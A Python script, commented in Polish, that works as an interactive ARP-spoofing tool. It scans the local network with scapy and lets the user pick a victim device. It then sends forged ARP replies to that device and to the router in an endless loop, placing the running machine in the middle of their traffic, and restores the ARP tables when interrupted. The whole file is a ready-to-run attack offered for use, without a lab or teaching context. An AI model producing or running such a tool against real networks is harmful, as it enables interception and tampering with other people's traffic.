import scapy.all as scapy
import psutil
import ipaddress


def get_local_network():
    """Automatycznie pobiera zakres sieci lokalnej na podstawie aktywnego interfejsu"""
    interfaces = psutil.net_if_addrs()
    for iface_name, iface_info in interfaces.items():
        for addr in iface_info:
            if addr.family == 2:  # IPv4
                ip = addr.address
                netmask = addr.netmask
                if ip != "127.0.0.1":  # Pomijamy localhost
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    return str(network)
    raise ValueError("Nie znaleziono aktywnego interfejsu sieciowego")


def scan(ip_range):
    """Skanuje sieć w podanym zakresie IP i zwraca listę urządzeń"""
    print(f"[INFO] Skanowanie sieci: {ip_range}")
    request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]

    devices = []
    for element in answered:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    return devices


def restore_defaults(dest, source):
    """Przywraca domyślne ustawienia ARP"""
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    """Zwraca adres MAC dla danego IP"""
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answer = scapy.srp(packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc


def spoofing(target, spoofed):
    """Wysyła spoofowany pakiet ARP"""
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)


def display_menu(devices):
    """Wyświetla menu z listą urządzeń i pozwala wybrać cel"""
    print("\nDostępne urządzenia w sieci:")
    for i, device in enumerate(devices):
        print(f"{i + 1}. IP: {device['ip']}, MAC: {device['mac']}")
    print("0. Wyjdź")

    choice = int(input("\nWybierz urządzenie (numer): "))
    if choice == 0:
        exit(0)
    elif 1 <= choice <= len(devices):
        return devices[choice - 1]
    else:
        print("Nieprawidłowy wybór. Spróbuj ponownie.")
        return display_menu(devices)


def main():
    try:
        # Automatyczne wykrywanie zakresu sieci
        network_range = get_local_network()
        devices = scan(network_range)

        if not devices:
            print("Nie znaleziono urządzeń w sieci.")
            exit(0)

        # Wyświetlenie menu i wybór urządzenia
        target_device = display_menu(devices)

        # Podaj IP routera (bramy domyślnej)
        router_ip = input("Podaj IP routera: ")

        print(f"Rozpoczynam spoofing: {target_device['ip']} <- {router_ip}")
        try:
            while True:
                spoofing(target_device["ip"], router_ip)
                spoofing(router_ip, target_device["ip"])
        except KeyboardInterrupt:
            print("\n[!] Proces przerwany. Przywracanie domyślnych ustawień ARP...")
            restore_defaults(target_device["ip"], router_ip)
            restore_defaults(router_ip, target_device["ip"])
            print("Przywrócono domyślne ustawienia. Zakończono.")
    except Exception as e:
        print(f"[ERROR] {e}")


if __name__ == "__main__":
    main()

